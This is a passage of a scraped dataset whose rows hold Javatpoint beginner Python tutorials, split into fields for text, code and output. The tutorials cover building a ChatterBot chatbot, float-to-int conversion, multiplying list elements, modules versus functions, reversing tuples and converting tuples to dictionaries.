my_chatbot.py', 'Explanation:', 'File: my_chatbot.py', 'Explanation:', 'File: my_chatbot.py', 'Explanation:', 'Now, the Python chatbot is ready to communicate.', 'Explanation:', 'As we move to the final step of creating a chatbot in Python, we can utilize a present corpus of data to train the Python chatbot even further.', 'Let us consider the following example of training the Python chatbot with a corpus of data given by the bot itself.', 'File: my_chatbot.py', 'Explanation:', 'A complete code for the Python chatbot project is shown below.', 'File: my_chatbot.py']","['Although chatbot in Python has already started to rule the tech scenario at present, chatbots had handled approximately 85% of the customer-brand interactions by 2020 as per the prediction of Gartner.', 'In light of the increasing popularity and adoption of chatbots in the industry, we can increase the market value by learning how to create a chatbot in Python - among the most extensively utilized programming languages globally.', 'Another amazing feature of the ChatterBot library is its language independence. The library is developed in such a manner that makes it possible to train the bot in more than one programming language.', 'We can also install the latest development version of the ChatterBot library directly from GitHub. For this, we will have to use the following command:', ""While the 'chatterbot.logic.MathematicalEvaluation' helps the chatbot solve mathematics problems, the ` helps it select the perfect match from the list of responses already provided."", 'In the above snippet of code, we have defined some list of responses in order to train the chatbot. We can also create and train the chatbot by simple typing an instance of ""ListTrainer"" and providing it with a list of strings as shown below:', 'In the above snippet of code, we have created an instance of the ListTrainer class and used the for-loop to iterate through each item present in the lists of responses.', 'We can use the get_response() function in order to interact with the Python chatbot. Let us consider the following execution of the program to understand it.', 'In the above snippet of code, we have imported the ChatterBotCorpusTrainer class from the chatterbot.trainers module. We created an instance of the class for the chatbot and set the training language to English.']","['A Chatbot is an Artificial Intelligence-based software developed to interact with humans in their natural languages. These chatbots are generally converse through auditory or textual methods, and they can effortlessly mimic human languages to communicate with human beings in a human-like way. A chatbot is considered one of the best applications of natural languages processing.', 'The first chatbot named ELIZA was designed and developed by Joseph Weizenbaum in 1966 that could imitate the language of a psychotherapist in only 200 lines of code. But as the technology gets more advance, we have come a long way from scripted chatbots to chatbots in Python today.', 'Today, we have smart Chatbots powered by Artificial Intelligence that utilize natural language processing (NLP) in order to understand the commands from humans (text and voice) and learn from experience. Chatbots have become a staple customer interaction utility for companies and brands that have an active online existence (website and social network platforms).', ""With the help of Python, Chatbots are considered a nifty utility as they facilitate rapid messaging between the brand and the customer. Let us think about Microsoft's Cortana, Amazon's Alexa, and Apple's Siri. Aren't these chatbots wonderful? It becomes quite interesting to learn how to create a chatbot using the Python programming language."", 'Fundamentally, the chatbot utilizing Python is designed and programmed to take in the data we provide and then analyze it using the complex algorithms for Artificial Intelligence. It then delivers us either a written response or a verbal one. Since these bots can learn from experiences and behavior, they can respond to a large variety of queries and commands.', 'ChatterBot is a Python library that is developed to provide automated responses to user inputs. It makes utilization of a combination of Machine Learning algorithms in order to generate multiple types of responses. This feature enables developers to construct chatbots using Python that can communicate with humans and provide relevant and appropriate responses. Moreover, the ML algorithms support the bot to improve its performance with experience.', 'When a user inserts a particular input in the chatbot (designed on ChatterBot), the bot saves the input and the response for any future usage. This information (of gathered experiences) allows the chatbot to generate automated responses every time a new input is fed into it.', 'The program picks the most appropriate response from the nearest statement that matches the input and then delivers a response from the already known choice of statements and responses. Over time, as the chatbot indulges in more communications, the precision of reply progresses.', 'We will begin building a Python chatbot by importing all the required packages and modules necessary for the project. We will also initialize different variables that we want to use in it. Moreover, we will also be dealing with text data, so we have to perform data preprocessing on the dataset before designing an ML model.', 'This is where tokenizing supports text data - it converts the large text dataset into smaller, readable chunks (such as words). Once this process is complete, we can go for lemmatization to transform a word into its lemma form. Then it generates a pickle file in order to store the objects of Python that are utilized to predict the responses of the bot.', 'The initial step to create a chatbot in Python using the ChatterBot library is to install the library in the system. We can also use a new Python virtual environment for the library installation as a good practice. We can install the library using the pip installer with the help of the following command in a Command prompt or Python terminal:', 'The next step is to create a chatbot using an instance of the class ""ChatBot"" and train the bot in order to improve its performance. Training the bot ensures that it has enough knowledge, to begin with, particular replies to particular input statements.', 'In the above snippet of code, we have defined a variable that is an instance of the class ""ChatBot"". We have included various parameters within the class. The first parameter, \'name\', represents the name of the Python chatbot. Another parameter called \'read_only\' accepts a Boolean value that disables (TRUE) or enables (FALSE) the ability of the bot to learn after the training. We have also included another parameter named \'logic_adapters\' that specifies the adapters utilized to train the chatbot.', 'Since we have to provide a list of responses, we can perform it by specifying the lists of strings that we can use to train the Python chatbot and find the perfect match for a certain query. Let us consider the following example of responses we can train the chatbot using Python to learn.', 'The above execution of the program tells us that we have successfully created a chatbot in Python using the chatterbot library. However, it is also necessary to understand that the chatbot using Python might not know how to answer all the queries. Since its knowledge and training are still very limited, we have to provide it time and give more training data to train it further.', 'Moreover, from the last statement, we can observe that the ChatterBot library provides this functionality in multiple languages. Thus, we can also specify a subset of a corpus in a language we would prefer. Hence, our chatbot in Python has been created successfully.']","['$ pip install chatterbot', '$ pip install chatterbot_corpus', '$ pip install git+git://github.com/gunthercox/ChatterBot.git@master', '$ pip install --upgrade chatterbot_corpus', '$ pip install --upgrade chatterbot', '# importing the required modules', 'from chatterbot import ChatBot', 'from chatterbot.trainers import ListTrainer', '# creating a chatbot', 'myBot = ChatBot(', ""name = 'Sakura',"", 'read_only = True,', 'logic_adapters = [', ""'chatterbot.logic.MathematicalEvaluation',"", ""'chatterbot.logic.BestMatch'"", ']', ')', '# training the chatbot', 'small_convo = [', ""'Hi there!',"", ""'Hi',"", ""'How do you do?',"", ""'How are you?',"", ""'I\\'m cool.',"", ""'Always cool.',"", ""'I\\'m Okay',"", ""'Glad to hear that.',"", ""'I\\'m fine',"", ""'I feel awesome',"", ""'Excellent, glad to hear that.',"", ""'Not so good',"", ""'Sorry to hear that.',"", ""'What\\'s your name?',"", ""' I\\'m Sakura. Ask me a math question, please.'"", 'math_convo_1 = [', ""'Pythagorean theorem',"", ""'a squared plus b squared equals c squared.'"", 'math_convo_2 = [', ""'Law of Cosines',"", ""'c**2 = a**2 + b**2 - 2*a*b*cos(gamma)'"", '# using the ListTrainer class', 'list_trainee = ListTrainer(myBot)', 'for i in (small_convo, math_convo_1, math_convo_2):', 'list_trainee.train(i)', 'from chatterbot.trainers import ChatterBotCorpusTrainer', 'corpus_trainee = ChatterBotCorpusTrainer(myBot)', ""corpus_trainee.train('chatterbot.corpus.english')"", '# importing the required modules', 'from chatterbot import ChatBot', 'from chatterbot.trainers import ListTrainer', 'from chatterbot.trainers import ChatterBotCorpusTrainer', '# creating a chatbot', 'myBot = ChatBot(', ""name = 'Sakura',"", 'read_only = True,', 'logic_adapters = [', ""'chatterbot.logic.MathematicalEvaluation',"", ""'chatterbot.logic.BestMatch'"", ']', ')', '# training the chatbot', 'small_convo = [', ""'Hi there!',"", ""'Hi',"", ""'How do you do?',"", ""'How are you?',"", ""'I\\'m cool.',"", ""'Always cool.',"", ""'I\\'m Okay',"", ""'Glad to hear that.',"", ""'I\\'m fine',"", ""'I feel awesome',"", ""'Excellent, glad to hear that.',"", ""'Not so good',"", ""'Sorry to hear that.',"", ""'What\\'s your name?',"", ""' I\\'m Sakura. Ask me a math question, please.'"", 'math_convo_1 = [', ""'Pythagorean theorem',"", ""'a squared plus b squared equals c squared.'"", 'math_convo_2 = [', ""'Law of Cosines',"", ""'c**2 = a**2 + b**2 - 2*a*b*cos(gamma)'"", '# using the ListTrainer class', 'list_trainee = ListTrainer(myBot)', 'for i in (small_convo, math_convo_1, math_convo_2):', 'list_trainee.train(i)', '# using the ChatterBotCorpusTrainer class', 'corpus_trainee = ChatterBotCorpusTrainer(myBot)', ""corpus_trainee.train('chatterbot.corpus.english')""]","['# starting a conversation', '>>> print(myBot.get_response(""Hi, there!""))', 'Hi', '>>> print(myBot.get_response(""What\'s your name?""))', ""I'm Sakura. Ask me a math question, please."", '>>> print(myBot.get_response(""Do you know Pythagorean theorem""))', 'a squared plus b squared equals c squared.', '>>> print(myBot.get_response(""Tell me the formula of law of cosines""))', 'c**2 = a**2 + b**2 - 2*a*b*cos(gamma)']",[],"['|||Rule-based Chatbots:The Rule-based approach trains a chatbot to answer questions based on a list of pre-determined rules on which it was primarily trained. These set rules can either be pretty simple or quite complex, and we can use these rule-based chatbots to handle simple queries but not process more complicated requests or queries.|||Self-learning Chatbots:Self-learning chatbots are chatbots that can learn on their own. These leverage advanced technologies such as Artificial Intelligence (AI) and Machine Learning (ML) to train themselves from behaviours and instances. Generally, these chatbots are quite smarter than rule-based bots. We can classify the Self-learning chatbots furtherly into two categories - Retrieval-based Chatbots and Generative Chatbots.||||||Retrieval-based Chatbots:A retrieval-based chatbot works on pre-defined input patterns and sets responses. Once the question or pattern is inserted, the chatbot utilizes a heuristic approach to deliver the relevant response. The model based on retrieval is extensively utilized to design and develop goal-oriented chatbots using customized features such as the flow and tone of the bot in order to enhance the experience of the customer.|||Generative Chatbots:Unlike retrieval-based chatbots, generative chatbots are not based on pre-defined responses - they leverage seq2seq neural networks. This is constructed on the concept of machine translation, where the source code is converted from one language to another language. In the seq2seq approach, the input is changed into an output.||||||']"
355,['How to Convert float to int in Python'],"['We have used different numeric data types in Python, in this tutorial we will learn how we can convert a float value to an integer value.']","['https://www.javatpoint.com/multiply-all-elements-in-list-of-python', 'https://www.javatpoint.com/chatbot-in-python', 'https://www.javatpoint.com/multiply-all-elements-in-list-of-python', 'https://www.javatpoint.com/chatbot-in-python', 'https://www.javatpoint.com/multiply-all-elements-in-list-of-python']",[],[],"['Using trunc()', 'Using floor()', 'Using ceil()', 'Using int()', 'Conclusion']",[],[],"[""Let's have a look at the approaches to implement the same-"", ""So, let's get started with the first one-"", 'The following program shows how we can use trunc() to convert a float value to an integer in Python.', 'Explanation-', ""It's time to understand what happened in the above program-"", 'In the next program, we will make use of floor().', ""First, let's understand what happens when we pass a float value in floor()?"", 'When a float number is passed in floor(), it rounds off the number down to the nearest integer.', 'Consider the program given below,', 'Explanation-', ""Let's have a glance at the explanation of this program."", 'Now, we shall see how ceil() can be used to do the same.', ""First, let's understand what happens when we pass a float value in ceil()?"", 'When a float number is passed in ceil(), it rounds off the number up to the nearest integer.', 'Explanation-', ""Let's understand what we have done in this program."", 'Finally, in the last program, we will use the most basic approach of converting a float value to an integer which is using int().', 'The program given below illustrates how it can be used in a program.', 'Explanation-', 'In this tutorial, we learned the interesting methods of converting a float to an integer in Python.']",[],[],"['#import trunc', 'from math import trunc', '#initialising the values', 'a = 20.33', 'b = 12.46', 'c = 9.54', 'res_sum = a + b + c', '#displaying the sum value', 'print(""The result of a + b + c is "", res_sum)', '#using trunc', 'print(""The converted value of a is: "", trunc(a))', 'print(""The converted value of b is: "", trunc(b))', 'print(""The converted value of c is: "", trunc(c))', 'print(""The converted value of sum is: "", trunc(res_sum))', '#import floor', 'from math import floor', '#initialising the values', 'a = 20.33', 'b = 12.46', 'c = 9.54', 'res_sum = a + b + c', '#displaying the sum value', 'print(""The result of a + b + c is "", res_sum)', '#using floor', 'print(""The converted value of a is: "", floor(a))', 'print(""The converted value of b is: "", floor(b))', 'print(""The converted value of c is: "", floor(c))', 'print(""The converted value of sum is: "", floor(res_sum))', '#import ceil', 'from math import ceil', '#initialising the values', 'a = 20.33', 'b = 12.46', 'c = 9.54', 'res_sum = a + b + c', '#displaying the sum value', 'print(""The result of a + b + c is "", res_sum)', '#using ceil', 'print(""The converted value of a is: "", ceil(a))', 'print(""The converted value of b is: "", ceil(b))', 'print(""The converted value of c is: "", ceil(c))', 'print(""The converted value of sum is: "", ceil(res_sum))', '#initialising the values', 'a = 20.33', 'b = 12.46', 'c = 9.54', 'res_sum = a + b + c', '#displaying the sum value', 'print(""The result of a + b + c is "", res_sum)', '#using int()', 'print(""The converted value of a is: "", int(a))', 'print(""The converted value of b is: "", int(b))', 'print(""The converted value of c is: "", int(c))', 'print(""The converted value of sum is: "", int(res_sum))']","['The result of a + b + c is 42.33', 'The converted value of a is: 20', 'The converted value of b is: 12', 'The converted value of c is: 9', 'The converted value of sum is: 42', 'The result of a + b + c is 42.33', 'The converted value of a is: 20', 'The converted value of b is: 12', 'The converted value of c is: 9', 'The converted value of sum is: 42', 'The result of a + b + c is 42.33', 'The converted value of a is: 21', 'The converted value of b is: 13', 'The converted value of c is: 10', 'The converted value of sum is: 43', 'The result of a + b + c is 42.33', 'The converted value of a is: 20', 'The converted value of b is: 12', 'The converted value of c is: 9', 'The converted value of sum is: 42']",[],"['|||Using trunc()|||Using floor()|||Using ceil()|||Using int()||||||Since we have to use trunc(), we have imported math in the first step.|||After this, we have initialized three float values and then calculated their sum.|||Finally, we have passed the variables a, b, c, and res_sum in trunc() to obtain the integer values.|||On executing the program, we obtain the desired output.||||||Since we have to use floor(), we have imported math in the first step.|||After this, we have initialized three float values and then calculated their sum.|||Finally, we have passed the variables a, b, c, and res_sum in the floor() to obtain the integer values.|||On executing the program, we obtain the desired output.||||||Since we have to use ceil(), we have imported math in the first step.|||After this, we have initialized three float values and then calculated their sum.|||Finally, we have passed the variables a, b, c, and res_sum in ceil() to obtain the integer values.|||On executing the program, we obtain the desired output.||||||We have initialized three float values and then calculated their sum.|||Finally, we have passed the variables a, b, c, and res_sum in int() to obtain the integer values.|||On executing the program, we obtain the desired output.|||']"
356,['Multiply All Elements in list of Python'],"['In this tutorial, we will learn how we can multiply all the elements of a list in Python.']","['https://www.javatpoint.com/module-vs-function-in-python', 'https://www.javatpoint.com/how-to-convert-float-to-int-in-python', 'https://www.javatpoint.com/module-vs-function-in-python', 'https://www.javatpoint.com/how-to-convert-float-to-int-in-python', 'https://www.javatpoint.com/module-vs-function-in-python']",[],[],"['Traversing the list', 'Using NumPy', 'Using lambda', 'Conclusion']",[],[],"['Let us have a look at some examples to understand our objective-', 'We can observe that in the output we have obtained the product of all the elements present in the list.', 'Since the first element is three, a is printed three times in the output.', 'We will learn the following methods-', ""Let's start with the first one,"", 'Consider the program given below-', 'Explanation-', ""It's time to have a look at the explanation of the above program-"", 'In the second program, we will see how NumPy can help us to implement the same.', 'The following program illustrates how it can be done in Python.', 'Explanation-', ""Let's understand what we have done in the above program."", 'Finally, we will learn how lambda can be used to multiply the elements of our list.', 'The program given below demonstrates the same-', 'Explanation-', 'Let us understand what happened in the above program.', 'In this tutorial, we learned the various approaches of multiplying the elements present in the list in Python.']",[],[],"['Input - [2, 3, 4]', 'Output - 24', ""Input - [3, 'a']"", 'Output - aaa', '#creating a function', 'def multiply_ele(list_value1):', '#multiply the elements', 'prod=1', 'for i in list_value1:', 'prod = prod*i', 'return prod', '#initializing the list', 'list_value1 = [10, 11, 12, 13, 14]', 'list_value2 = [2, 3, 4, 5, 6, 7]', '#displaying the resultant values', 'print(""The multiplication of all the elements of list_value1 is: "", multiply_ele(list_value1))', 'print(""The multiplication of all the elements of list_value2 is: "", multiply_ele(list_value2))', '#importing the NumPy module', 'import numpy', '#initializing the list', 'list_value1 = [10, 11, 12, 13, 14]', 'list_value2 = [2, 3, 4, 5, 6, 7]', '#using numpy.prod()', 'res_list1 = numpy.prod(list_value1)', 'res_list2 = numpy.prod(list_value2)', '#displaying the resultant values', 'print(""The multiplication of all the elements of list_value1 is: "", res_list1)', 'print(""The multiplication of all the elements of list_value2 is: "", res_list2)', '#importing the module', 'from functools import reduce', '#initializing the list', 'list_value1 = [10, 11, 12, 13, 14]', 'list_value2 = [2, 3, 4, 5, 6, 7]', '#using numpy.prod()', 'res_list1 = reduce((lambda a, b:a*b), list_value1)', 'res_list2 = reduce((lambda a, b:a*b), list_value2)', '#displaying the resultant values', 'print(""The multiplication of all the elements of list_value1 is: "", res_list1)', 'print(""The multiplication of all the elements of list_value2 is: "", res_list2)']","['The multiplication of all the elements of list_value1 is: 240240', 'The multiplication of all the elements of list_value2 is: 5040', 'The multiplication of all the elements of list_value1 is: 240240', 'The multiplication of all the elements of list_value2 is: 5040', 'The multiplication of all the elements of list_value1 is: 240240', 'The multiplication of all the elements of list_value2 is: 5040']",[],"['|||Traversing the list|||Using NumPy|||Using lambda||||||In the first step, we have created a function that will make the list as an input.|||In the function definition, we have used a for loop that takes each element from the list, multiplies it with one initially, and then prints the resultant value of the product.|||In the next step, we have initialized the lists and then passed them into our function.|||On executing this program, the desired output is displayed.||||||In the first step, we have imported the NumPy module.|||In the next step, we have initialized the values of the two lists, list_value1 and list_value2.|||After this, we will use prod() that will compute the product of the elements present in the lists.|||On executing the program, the expected output is displayed.||||||In the first step, we have imported reduce from|||After this, we have initialized the two lists, list_value1 and list_value2.|||We have used the precise way of defining functions, which is lambda, and then provided the required functionality.|||On executing the program, the desired values are displayed.|||']"
357,['Difference between module and function in Python'],"['Python is a programming language that is considered to be progressive and known for its optimization capabilities. Python skims down redundant characteristics of programming and makes the tools rich in utilization. In the following tutorial, we will discuss the difference between module and function in the Python programming language.']","['https://www.javatpoint.com/reverse-a-tuple-in-python', 'https://www.javatpoint.com/multiply-all-elements-in-list-of-python', 'https://www.javatpoint.com/reverse-a-tuple-in-python', 'https://www.javatpoint.com/multiply-all-elements-in-list-of-python', 'https://www.javatpoint.com/reverse-a-tuple-in-python']",[],[],"['What is a Module?', 'What is a Function?', 'Defining and Using a Module in Python', 'Defining and Calling a Function in Python', 'Conclusion']","['User-defined functions:', 'Built-in functions:', 'Lambda functions:', 'Recursion functions:']","['Note: As soon as we have included the module in the program code, we have executed the code without calling any function. That is because we have defined and called the functions in the file. Therefore, the entire file is executed first treated as a larger scale function, being executed while being called.']","['A module is simply a Python file with a .py extension that a programmer can import inside another Python program.', 'The name of the Python file becomes the name of the module.', 'The module consists of definitions and implementation of -', 'That can be utilized within another program.', 'Benefits of modules', 'Functions that are defined by us in order to perform a particular activity are termed User-defined functions. ', 'Benefits of User-defined functions', 'Python has different functions that are readily available for use. These functions are known as Built-in functions.', 'List of Built-in functions', 'Lambda functions are known as Anonymous functions that are defined without a name.', 'While we can define normal functions using the def keyword in Python, we can define anonymous functions with the help of the lambda keyword.', 'Use of Lambda function in Python:', 'Lambda functions are utilized along with built-in functions such as filter(), map(), and a lot more.', 'In the following section, we will understand how we can define and use a module in Python.', 'We can use the import command in order to include multiple modules.', 'Let us consider the following example.', 'Let us consider the following example for the same.', 'Explanation:', 'In the following section, we will understand how we can define and call a function in Python.', 'Let us consider the following example in order to understand the definition and calling of a function.', 'Explanation:', 'We can pass a parameter to the function and make the above block of code more reusable by not hard coding the string.', 'Let us consider the following example for the same.', 'Explanation:']","['A function is a block of organized and reusable code that we can perform a single, associated activity. The functions are classified into different types -', 'To need a nameless function for a short period of time. In Python, we usually use it as a parameter to a higher-order function (a function that accepts other functions as parameters).', 'A Recursive function is a function defined in terms of itself through self-referential expressions. This means that the function will continue to call itself and repeat its behavior until some requirements are met to return an output.', 'In order to begin, we will create a Python program file with a .py extension and save it in the local repository. Now we can utilize this program file to import it into the application to involve the functionality of the module in the application.', 'We can delete the calls of the function from the module we created and access the functions attributes, classes, and all the other valuables using the dot (.) operator.', 'In the above snippet of code, we have imported the math module. We have then used the sqrt() function of the math module to find the square root of 16 and printed the value for the users.', 'In the above snippet of code, we have defined a simple function that prints a string and terminates. The code of this function can also be altered in order to make it quite more useful.', 'As we can observe, we do not have to rewrite the function or define it repeatedly for different strings. We can call this function multiple times in the whole application.']","[""In the above snippet of code, we have defined a function that accepts a parameter as 'name' and printed a statement including that parameter. We have then called the function by specifying the value of the name parameter and printed different statements from one function."", 'Modules and functions may appear similar to their purpose, which is reusability. However, modules are on a larger scale because of their use in different classes, functions, and attributes to fulfil larger functionalities. At the same time, functions are more particular to specific activities on a smaller scale.']","['abs(), delattr(), hash(), memoryview(), set(), all(), dict(), help(), min(), setattr(), any(), dir(), hex(), next(), slice(), ascii(), divmod(), id(), object(), sorted(), bin(), enumerate(), input(), oct(), staticmethod(), bool(), eval(), int(), open(), str(), breakpoint(), exec(), isinstance(), ord(), sum(), bytearray(), filter(), issubclass(), pow(),super(), bytes(), float(), iter(), print(), tuple(), callable(), format(), len(), property(), type(), chr(), frozenset(), list(), range(), vars(), classmethod(), getattr(), locals(), repr(), zip(), compile(), globals(), map(), reversed(), __import__(), complex(), hasattr(), max(), round()', 'import module_1, module_2, ...', '# importing a module', 'import math', 'module_1.func_1()', 'module_2.name', '# importing a module', 'import math', '# using the sqrt() function of the math module', 'print(""Square root of 16:"", math.sqrt(16))', '# defining a function', 'def my_func():', 'print(""Greetings User! Welcome to Javatpoint."")', '# calling the function', 'my_func()', '# defining a function', 'def my_func(name):', 'print(""Greetings "" + name + "", Welcome to Javatpoint."")', '# calling the function', 'my_func(""Daniel"")', 'my_func(""Michelle"")', 'my_func(""Chris"")', 'my_func(""Dana"")']","['Square root of 16: 4.0', 'Greetings User! Welcome to Javatpoint.', 'Greetings Daniel, Welcome to Javatpoint.', 'Greetings Michelle, Welcome to Javatpoint.', 'Greetings Chris, Welcome to Javatpoint.', 'Greetings Dana, Welcome to Javatpoint.']",[],"['|||Classes|||Variables|||Functions||||||Reusability:Working with modules makes the code reusable.|||Simplicity:The module targets a small proportion of the problem rather than aiming at the complete problem.|||Scoping:A Module defines a distinct namespace that supports avoiding collisions between identifiers.||||||User-defined functions|||Built-in functions|||Lambda functions|||Recursive functions||||||We can use the User-defined functions to decompose a large program into small segments, which makes the program easy to understand, maintain and debug.|||Suppose repeated code occurs in a program. We can use the function to include those codes and execute when required by calling that function.||||||filter()\\: As the name suggests, it is used to filter the iterables as per the requirements. The filter() function filters the original iterable and passes the elements that return TRUE for the function given to the filter.|||map()\\: The map() function executes all the requirements of a function on the elements in the iterable and allows us to apply a function on it and then passes it to the result, which can have identical as well as different values.|||']"
358,['Reverse a tuple in Python'],['We know that tuples are the data structures present in Python in which elements of different data types can be enclosed in parenthesis.'],"['https://www.javatpoint.com/tuple-to-dictionary-in-python', 'https://www.javatpoint.com/module-vs-function-in-python', 'https://www.javatpoint.com/tuple-to-dictionary-in-python', 'https://www.javatpoint.com/module-vs-function-in-python', 'https://www.javatpoint.com/tuple-to-dictionary-in-python']",[],[],"['Using Slicing', 'Using reversed() method', 'Using Generator in Python', 'Using the indexing technique', 'Conclusion']",[],[],"['In this tutorial, we will learn how we can reverse a tuple in Python.', 'Consider the following examples to understand our objective-', 'Explanation -', 'We can observe here that since we have reversed the elements of the tuple, the float value present at the last comes in the first place.', ""Let's see one more example-"", 'Explanation -', 'We can observe here that since we have reversed the elements of the tuple, the string value present at the last comes in the first place.', 'We will use the following methods to reverse a tuple in Python,', ""So, let's get started with the first one:"", 'The slicing technique used in Python to slice the elements that lie in a specific range.', 'The following program illustrates how they can be used.', 'Explanation-', ""It's time to have a look at the explanation of the above program-"", 'In the second program, we will learn how method can be used.', 'Consider the program given below,', 'Explanation-', ""Let's understand what happened in the above program,"", 'In the third program, we will see how generators can be used for the same.', 'The program given below demonstrates how generators can be used in our Python program.', 'Explanation-', ""It's time to have a glance at the explanation,"", 'Finally, we will see how indexing can help us to meet our objective.', 'The following program illustrates how it can be done', 'Explanation-', ""It's time to have a look at the explanation of the above program-"", 'In this tutorial, we discussed the different approaches of reversing a tuple in Python.']",[],[],"[""Input - (21, 54, 1, 'apple', 'fruits', 11.7)"", ""Output - (11.7, 'fruits', 'apple', 1, 54, 21)"", ""Input - (20, 30, 50, 19.3, 41, 'comic books')"", ""Output - ('comic books', 41, 19.3, 50, 30, 20)"", '#initializing the tuple', ""tuple_values = (1, 2, 'Python', 'Java', 23.4, 77, 10)"", '#displaying the original tuple', 'print(""The original tuple is: "", tuple_values)', '#using slicing', 'tuple_values = tuple_values[::-1]', '#displaying the tuple', 'print(""The reversed tuple is: "", tuple_values)', '#initializing the tuple', ""tuple_values = (1, 2, 'Python', 'Java', 23.4, 77, 10)"", '#displaying the original tuple', 'print(""The original tuple is: "", tuple_values)', '#using slicing', 'tuple_values = tuple(reversed(tuple_values))', '#displaying the tuple', 'print(""The reversed tuple is: "", tuple_values)', '#initializing the tuple', ""tuple_values = (1, 2, 'Python', 'Java', 23.4, 77, 10)"", '#displaying the original tuple', 'print(""The original tuple is: "", tuple_values)', '#creating a function', 'def reverse_tup(tuple_values):', 'for i in reversed(range(len(tuple_values))):', 'yield tuple_values[i]', '#displaying the items in reverse order', 'for i in reverse_tup(tuple_values):', 'print(""The element of a reversed tuple are: "", i)', '#initializing the tuple', ""tuple_values=(1, 2, 'Python', 'Java', 23.4, 77, 10)"", '#displaying the original tuple', 'print(""The original tuple is: "", tuple_values)', '#displaying the items in reverse order', 'for i in range(len(tuple_values)):', 'print(""The element of a reversed tuple is: "", tuple_values[-(i+1)])']","[""The original tuple is:  (1, 2, 'Python', 'Java', 23.4, 77, 10)"", ""The reversed tuple is:  (10, 77, 23.4, 'Java', 'Python', 2, 1)"", ""The original tuple is:  (1, 2, 'Python', 'Java', 23.4, 77, 10)"", ""The reversed tuple is:  (10, 77, 23.4, 'Java', 'Python', 2, 1)"", ""The original tuple is:  (1, 2, 'Python', 'Java', 23.4, 77, 10)"", 'The elements of a reversed tuple are:  10', 'The elements of a reversed tuple are:  77', 'The elements of a reversed tuple are:  23.4', 'The elements of a reversed tuple are:  Java', 'The elements of a reversed tuple are:  Python', 'The elements of a reversed tuple are:  2', 'The elements of a reversed tuple are:  1', ""The original tuple is:  (1, 2, 'Python', 'Java', 23.4, 77, 10)"", 'The element of a reversed tuple is:  10', 'The element of a reversed tuple is:  77', 'The element of a reversed tuple is:  23.4', 'The element of a reversed tuple is:  Java', 'The element of a reversed tuple is:  Python', 'The element of a reversed tuple is:  2', 'The element of a reversed tuple is:  1']",[],"['|||Using Slicing|||Using reversed() method|||Using Generator in Python|||Using the indexing technique||||||In the first step, we have initialized our tuple with different values.|||After this, we have displayed our tuple and then used slicing to print the elements of our tuple in reverse order by specifying the step as -1.|||Finally, we have displayed the reversed tuple.||||||In the first step, we have initialized our tuple with different values.|||After this, we have displayed our tuple and then used the reversed() to print the elements of our tuple in reverse order.|||Finally, we have displayed the reversed tuple.||||||In the first step, we have initialized our tuple with different values.|||After this, we have displayed our tuple and then created a function that takes a tuple as its parameter and helps us to obtain the tuple in reversed order using the concept of generators.|||Finally, we have displayed the reversed tuple.||||||In the first step, we have initialized our tuple with different values.|||After this, we have displayed our tuple and then created a function that takes the elements of our tuple, uses for loop to traverse the tuple, and then print the elements in reverse order by specifying the index as -1.|||Finally, we have displayed the reversed tuple.|||']"
359,['Tuple to Dictionary in Python'],"['In this tutorial, we will discuss how we can convert a tuple to a dictionary in Python.']","['https://www.javatpoint.com/datetime-timedelta-function-of-python', 'https://www.javatpoint.com/reverse-a-tuple-in-python', 'https://www.javatpoint.com/datetime-timedelta-function-of-python', 'https://www.javatpoint.com/reverse-a-tuple-in-python', 'https://www.javatpoint.com/datetime-timedelta-function-of-python']",[],[],"['Using setdefault()', 'Using dict()', 'Using Dictionary Comprehension', 'Using zip() and dict()', 'Conclusion']",[],[],"['We will use the following techniques to convert a tuple to a dictionary in Python-', ""Let's get started with the first one,"", 'The function of setdefault() is to return the value associated with a key and if the key is not present it is inserted with a default value.', 'The following program illustrates how it can be used in a Python program.', 'Explanation-', 'In the second program, we will learn how dict() can be used for the same.', ""The dict() is used to create a dictionary in Python, let's see how it can add meaning to our program."", 'Consider the program given below,', 'Explanation-', 'In the third program, we will see how dictionary comprehension can help us.', 'The program below shows the same,', 'Explanation-', 'In the last program, we will learn how zip() and dict() can be used in the Python program.', 'The following program illustrates the same-', 'Explanation-', 'In this tutorial, we learned the different methods of converting a tuple to a dictionary in Python.']","['We know that the elements of tuples are enclosed within parentheses and the elements of a dictionary are present in the form of a key-value pair and are enclosed within curly brackets.', 'We have understood how the dict() works, here we will be applying both dict() and zip(), the zip() method takes the iterable items and appends them to form a single tuple.']",[],"['#creating a function', 'def convert_dict(tup, dic):', 'for i, j in tup:', 'dic.setdefault(i, []).append(j)', 'return dic', '#initialising the tuple values', 'tuple_values = [(""English"", 2001), (""Hindi"", 2002), (""Mathematics"", 2003),', '(""Computer Science"", 2004), (""Physics"", 2005), (""Chemistry"", 2006)]', 'res_dictionary = {}', '#displaying the resultant dictionary', 'print (""The converted dictionary is: "", convert_dict(tuple_values,res_dictionary))', '#creating a function', 'def convert_dict(tup, dic):', '#use of dict()', 'dic = dict(tup)', 'return dic', '#initialising the tuple values', 'tuple_values = [(""English"", 2001), (""Hindi"", 2002), (""Mathematics"", 2003),', '(""Computer Science"", 2004), (""Physics"", 2005), (""Chemistry"", 2006)]', 'res_dictionary = {}', '#displaying the resultant dictionary', 'print (""The converted dictionary is: "", convert_dict(tuple_values,res_dictionary))', '#initialising the tuple values', ""sub_names = ('English', 'Hindi', 'Mathematics', 'Computer Science', 'Physics', 'Chemistry')"", 'sub_codes = (2001, 2002, 2003, 2004, 2005, 2006)', '#displaying the tuples', 'print(""The values in sub_names are: "", sub_names)', 'print(""The values in sub_codes are: "", sub_codes)', 'if len(sub_names) == len(sub_codes):', 'res_dict = {sub_names[i]: sub_codes[i] for i, _ in enumerate(sub_codes)}', '#displaying the resultant dictionary', 'print(""The resultant dictionary is: "", res_dict)', '#initialising the tuple values', ""sub_names = ('English', 'Hindi', 'Mathematics', 'Computer Science', 'Physics', 'Chemistry')"", 'sub_codes = (2001, 2002, 2003, 2004, 2005, 2006)', '#displaying the tuples', 'print(""The values in sub_names are: "", sub_names)', 'print(""The values in sub_codes are: "", sub_codes)', 'if len(sub_names) == len(sub_codes):', '#using zip() and dict()', 'res_dict = dict(zip(sub_names, sub_codes))', '#displaying the resultant dictionary', 'print(""The resultant dictionary is: "", res_dict)']","[""The converted dictionary is: {'English': [2001], 'Hindi': [2002], 'Mathematics': [2003], 'Computer Science': [2004], 'Physics': [2005], 'Chemistry': [2006]}"", ""The converted dictionary is: {'English': 2001, 'Hindi': 2002, 'Mathematics': 2003, 'Computer Science': 2004, 'Physics': 2005, 'Chemistry': 2006}"", ""The values in sub_names are: ('English', 'Hindi', 'Mathematics', 'Computer Science', 'Physics', 'Chemistry')"", 'The values in sub_codes are: (2001, 2002, 